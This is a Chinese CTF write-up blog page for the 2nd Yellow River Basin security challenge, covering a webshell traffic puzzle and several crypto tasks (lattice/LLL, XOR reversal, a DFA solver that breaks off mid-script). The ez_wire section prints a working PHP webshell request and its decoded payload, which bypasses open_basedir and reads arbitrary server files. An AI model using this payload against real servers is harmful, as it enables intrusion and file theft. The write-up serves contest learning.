<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="miscez_wirewebshell的流量，追踪每一个http流量，先对其进行url解密，再base64解， 最后在一个流量中发现: 1234567891011121314151617181920POST &#x2F;shell.php HTTP&#x2F;1.1Host: 172.16.80.10:8080Accept-Encoding: gzip, deflateUser-Agent: Mozilla&#x2F;5.0">
<meta property="og:type" content="article">
<meta property="og:title" content="第二届黄河流域网络安全技能挑战赛">
<meta property="og:url" content="http://example.com/2024/05/13/wp/index.html">
<meta property="og:site_name" content="rota">
<meta property="og:description" content="miscez_wirewebshell的流量，追踪每一个http流量，先对其进行url解密，再base64解， 最后在一个流量中发现: 1234567891011121314151617181920POST &#x2F;shell.php HTTP&#x2F;1.1Host: 172.16.80.10:8080Accept-Encoding: gzip, deflateUser-Agent: Mozilla&#x2F;5.0">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-05-13T13:27:48.355Z">
<meta property="article:modified_time" content="2024-05-13T13:29:06.615Z">
<meta property="article:author" content="rota">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2024/05/13/wp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>第二届黄河流域网络安全技能挑战赛 | rota</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">rota</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rota">
      <meta itemprop="description" content="少年不惧岁月长，彼方尚有荣光在">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rota">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          第二届黄河流域网络安全技能挑战赛
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-05-13 21:27:48 / 修改时间：21:29:06" itemprop="dateCreated datePublished" datetime="2024-05-13T21:27:48+08:00">2024-05-13</time>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="ez-wire"><a href="#ez-wire" class="headerlink" title="ez_wire"></a>ez_wire</h3><p>webshell的流量，追踪每一个http流量，先对其进行url解密，再base64解，</p>
<p>最后在一个流量中发现:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /shell.php HTTP/1.1</span><br><span class="line">Host: 172.16.80.10:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1422</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=%40eval(%40base64_decode(%24_POST%5B&#x27;h50e3056ff32e1&#x27;%5D))%3B&amp;h50e3056ff32e1=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjQ1YTliM2IwN2QiO0Bta2RpcigkdG1kaXIpO2lmKCFAZmlsZV9leGlzdHMoJHRtZGlyKSl7Y29udGludWU7fSR0bWRpcj1yZWFscGF0aCgkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCAiLi4iKTskY250YXJyPUBwcmVnX3NwbGl0KCIvXFxcXHxcLy8iLCR0bWRpcik7Zm9yKCRpPTA7JGk8c2l6ZW9mKCRjbnRhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9O0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIvIik7QHJtZGlyKCR0bWRpcik7YnJlYWs7fTt9OztmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzUiLiI5MmMiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjg4MTYiLiIzMjYzIjt9b2Jfc3RhcnQoKTt0cnl7JEY9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJ1ZjVmZDVkMjkxNTBmZCJdLDIpKTskUD1AZm9wZW4oJEYsInIiKTtlY2hvKEBmcmVhZCgkUCxmaWxlc2l6ZSgkRik%2FZmlsZXNpemUoJEYpOjQwOTYpKTtAZmNsb3NlKCRQKTs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw%3D%3D&amp;uf5fd5d29150fd=uLL2ZsYWcudHh0HTTP/1.1 200 OK</span><br><span class="line">Host: 172.16.80.10:8080</span><br><span class="line">Date: Sat, 23 Sep 2023 02:13:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/8.2.7</span><br><span class="line">Content-type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3592cREFTQ1RGezhkOWNkNWU1LTFjYzctMGNhZi05MjRlLTk4NzMxZDNjMTAwZX0=88163263</span><br></pre></td></tr></table></figure>
<p>解码后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(base64_decode(&quot;Lzt8Oi8=&quot;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.45a9b3b07d&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return @base64_encode($out);&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;35&quot;.&quot;92c&quot;;echo @asenc($output);echo &quot;8816&quot;.&quot;3263&quot;;&#125;ob_start();try&#123;$F=base64_decode(substr($_POST[&quot;uf5fd5d29150fd&quot;],2));$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br><span class="line"></span><br><span class="line">DASCTF&#123;8d9cd5e5-1cc7-0caf-924e-98731d3c100e&#125;</span><br></pre></td></tr></table></figure>
<p>响应的流量包中要根据前面请求的去掉一部分开头和结尾，才能正确解密</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="easyntru"><a href="#easyntru" class="headerlink" title="easyntru"></a>easyntru</h3><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">bits = 2048</span><br><span class="line">while True:</span><br><span class="line">  q = random_prime(2^bits, lbound=2^(bits - 1))</span><br><span class="line">  f = random_prime(2^(3*bits//4 - 1))</span><br><span class="line">  g = random_prime(2^(bits//4 - 1))</span><br><span class="line">  if gcd(f, q*g) == 1:</span><br><span class="line">    h = f.inverse_mod(q) * g % q</span><br><span class="line">    break</span><br><span class="line">r = random_prime(2^(3*bits//4 - 1))</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">assert m &lt; 2^(bits//4)</span><br><span class="line">c = (r * h + m) % q</span><br><span class="line"></span><br><span class="line">print(&#x27;q = %d&#x27; % q)</span><br><span class="line">print(&#x27;h = %d&#x27; % h)</span><br><span class="line">print(&#x27;c = %d&#x27; % c)</span><br><span class="line">q = 24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893</span><br><span class="line">h = 4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633</span><br><span class="line">c = 23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>仔细审题其实发现这题跟前面那坨没关系,主要是这个式子c &#x3D; (r * h + m) % q<br>造个格</p>
<p>$$(k,1,-r)\times$$$$\begin{pmatrix}2^{1023}*q &amp; 0 &amp; 0 \2^{1023}*c &amp; 2^{1535} &amp; 0\2^{1023}*h &amp; 0 &amp; 1\end{pmatrix}$$</p>
<p>LLL规约得到r</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">q = 24445829856673933058683889356407393860808522483552243481673407476395441107312130500945533047834993780864465577896968035259377721441466959027298166974554621753030728893320770628116412892838297326949997096948374940319126319050202262831370086992122741039059235809755486170276098658609363789670834482459758766315965501103856358827004129316458293962968758091319313119139703281758409686502729987426264868783862562150543872477975124482520151991822540312287812454562890993596447391870392038170902308036014733295394468384998808411243690466996284064331048659179342050962003962851315539367769981491650514319735943099663094899893</span><br><span class="line">h = 4913183942329791657370364901346185016154546804260113829799181697126245901054001842015324265348151984020885129647620152505641164596983663274947698263948774663097557712000980632171097748594337673511102227336174939704483645747401790373320060474777199502879236509921155985395351647045776678540066383822814858118010995298071799515355111562392871675582742450331679030377003011729873888234401630551097244308473512890467393558048369156638425711104036276296581364374424105121033213701940135560177615395895359023414249846471332180098181632276243857635719541258706892559869642925945927703702696983949003370155033272664851406633</span><br><span class="line">c = 23952867341969786229998420209594360249658731959635047659110331734424497403162506614140213749790708068086973241468969253395309243550869149482017583754015801740198734485871141965939993554966887039832701333623276590311516052334557237678750680087492306461195312290860900992532859827406262394480605001436094705579158919540851727801502678160085863180222123880690741582667929660533985778430252783414931317574267109741748071838599712027351385462245528001743693258053631099442571041984251010436099847588345982312217135023484895981833846397834589554744611429133085987275209019352039744743479972391909531680560125335638705509351</span><br><span class="line"></span><br><span class="line">T=2^1023</span><br><span class="line">A=matrix(ZZ,[[T*q,0,0],[T*c,2^1535,0],[T*h,0,1]])</span><br><span class="line">r=abs(A.LLL()[1][2])</span><br><span class="line">m = (c-r*h) % q</span><br><span class="line">long_to_bytes(m)</span><br><span class="line">#b&#x27;flag&#123;7c95453a-e577-40d8-9ad0-993655b83b69&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="easy-encrypt"><a href="#easy-encrypt" class="headerlink" title="easy_encrypt"></a>easy_encrypt</h3><p>仔细分析后，发现encrypt_1函数能还原c1的前半部分,而后半部分将encrypt_1改改就行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def f(word, key):</span><br><span class="line">    out = &quot;&quot;</span><br><span class="line">    for i in range(len(word)):</span><br><span class="line">        out += chr(ord(word[i]) ^^ key)</span><br><span class="line">    return out</span><br><span class="line">m, n = 17, 18</span><br><span class="line">num = [0]*18</span><br><span class="line">def encrypt_1(key):</span><br><span class="line">    L, R = key[0:len(key)//2], key[len(key)//2:]</span><br><span class="line">    x=&#x27;&#x27;</span><br><span class="line">    for i in range(len(L)):</span><br><span class="line">        x += chr(ord(f(R, m)[i]) ^^ ord(L[i]))</span><br><span class="line">    y = f(R, 2)</span><br><span class="line">    L, R = y, x</span><br><span class="line">    x=&#x27;&#x27;</span><br><span class="line">    for i in range(len(L)):</span><br><span class="line">        x += &quot;&quot;.join(chr(ord(f(R, n)[i]) ^^ ord(L[i])) )</span><br><span class="line">    y = f(R, 2)</span><br><span class="line">    cipher = x + y</span><br><span class="line">    return(cipher)</span><br><span class="line">def decrypt_1(key):</span><br><span class="line">    x,y = key[0:len(key)//2],key[len(key)//2:]</span><br><span class="line">    R = f(y,2)</span><br><span class="line">    L = &#x27;&#x27;</span><br><span class="line">    for i in range(len(x)):</span><br><span class="line">        L += &quot;&quot;.join(chr(ord(f(R, n)[i]) ^^ ord(x[i])) )</span><br><span class="line">    return f(L,2)</span><br><span class="line">with open(&#x27;cipher.txt&#x27;, &#x27;r&#x27;) as file: </span><br><span class="line">    c1 = file.readlines() </span><br><span class="line">c1 = c1[:-1]</span><br><span class="line">flag1 = encrypt_1(c1)[:len(c1)//2]+decrypt_1(c1)</span><br><span class="line">#&#x27;flag&#123;W0w_y0U_FiND_&#x27;</span><br></pre></td></tr></table></figure>
<p>第二部分，就简单异或，逆向一下即可:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_2(num):</span><br><span class="line">    l=len(num)</span><br><span class="line">    k = 0</span><br><span class="line">    key = [0]*l</span><br><span class="line">    for i in range(l):</span><br><span class="line">        key[i] = (num[i] ^^ (k % 3 + 1)) - i</span><br><span class="line">        key[l-i-1] =  (num[l-i-1] ^^ (k % 3 +1)) + i + 1 - l</span><br><span class="line">        k+=1</span><br><span class="line">    flag2 = &#x27;&#x27;</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        flag2+=chr(key[i])</span><br><span class="line">    return flag2</span><br><span class="line">c2= [119, 107, 102, 97, 58, 114, 122, 124, 108, 122, 72, 45, 49, 48, 44, 49, 51, 141]</span><br><span class="line">flag2=decrypt_2(c2)</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line">#&#x27;flag&#123;W0w_y0U_FiND_the_4nswer@#$%!!!&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="baby-dfa"><a href="#baby-dfa" class="headerlink" title="baby_dfa"></a>baby_dfa</h3><p>参考大佬博客<a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/a5bd8c0d.html">Crypto趣题-分组密码 | 糖醋小鸡块的blog (tangcuxiaojikuai.xyz)</a></p>
<p>将大佬的脚本拿来稍微改改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from pwn import *</span><br><span class="line">from binascii import *</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">def rotl(x, n): return ((x &lt;&lt; n) &amp; 0xffffffff) | ((x &gt;&gt; (32 - n)) &amp; 0xffffffff)</span><br><span class="line"></span><br><span class="line">def xorl(x, y): return list(map(lambda a, b: a ^ b, x, y))</span><br><span class="line"></span><br><span class="line">def List2Int(x): return x[0] &lt;&lt; 24 | x[1] &lt;&lt; 16 | x[2] &lt;&lt; 8 | x[3]</span><br><span class="line"></span><br><span class="line">def Int2List(x): return [x &gt;&gt; 24, (x &gt;&gt; 16) &amp; 0xff, (x &gt;&gt; 8) &amp; 0xff, x &amp; 0xff]</span><br><span class="line"></span><br><span class="line">def l(B):</span><br><span class="line">    B = List2Int(B)</span><br><span class="line">    B = B ^ rotl(B, 2) ^ rotl(B, 10) ^ rotl(B, 18) ^ rotl(B, 24)</span><br><span class="line">    return Int2List(B)</span><br><span class="line"></span><br><span class="line">def decrypt(K,cipher,inv_S):</span><br><span class="line">    T = List2Int(xorl(K[4:],cipher))</span><br><span class="line">    s = Solver() </span><br><span class="line">    B = BitVec(&#x27;B&#x27;,32)</span><br><span class="line">    s.add(B ^ rotl(B, 2) ^ rotl(B, 10) ^ rotl(B, 18) ^ rotl(B, 24) == T)</span><br><span class="line">    if s.check() == sat:    #检测是否有解</span><br><span class="line">        result = str(s.model()) </span><br><span class="line">        T = Int2List(int(result[5:-1]))</span><br><span class="line">        for i in range(len(T)):</span><br><span class="line">            T[i] = inv_S[T[i]]</span><br><span class="line">    T = List2Int(xorl(K[:4],T))</span><br><span class="line">    return long_to_bytes(T).hex()</span><br><span class="line"></span><br><span class="line">def getflag():</span><br><span class="line">        while(1):</span><br><span class="line">            try:</span><br><span class="line">                r = remote(&quot;60.204.206.104&quot;,7000)</span><br><span class="line">                r.recvuntil(b&quot;sbox: &quot;)</span><br><span class="line">                S = eval(r.recvline())</span><br><span class="line">                inv_S = [0 for i in range(256)]</span><br><span class="line">                for i in range(256):</span><br><span class="line">                    inv_S[S[i]] = i</span><br><span class="line"></span><br><span class="line">                x = []</span><br><span class="line">                #0</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(b&quot;\x00&quot;*4))</span><br><span class="line">                x.append(unhexlify(r.recvline().strip()))</span><br><span class="line">                print(x)</span><br><span class="line">                </span><br><span class="line">                #1</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(b&quot;\x00&quot;*3 + b&quot;\x01&quot;*1 +b&quot;\x00&quot;*0))       </span><br><span class="line">                x.append(unhexlify(r.recvline().strip()))</span><br><span class="line">                print(x)</span><br><span class="line">                #2</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(b&quot;\x00&quot;*2 + b&quot;\x01&quot;*1 +b&quot;\x00&quot;*1))</span><br><span class="line">                x.append(unhexlify(r.recvline().strip()))</span><br><span class="line">                print(x)</span><br><span class="line">                #3</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(b&quot;\x00&quot;*1 + b&quot;\x01&quot;*1 +b&quot;\x00&quot;*2))</span><br><span class="line">                x.append(unhexlify(r.recvline().strip()))</span><br><span class="line">                print(x)</span><br><span class="line">                #4</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(b&quot;\x00&quot;*0 + b&quot;\x01&quot;*1 +b&quot;\x00&quot;*3))</span><br><span class="line">                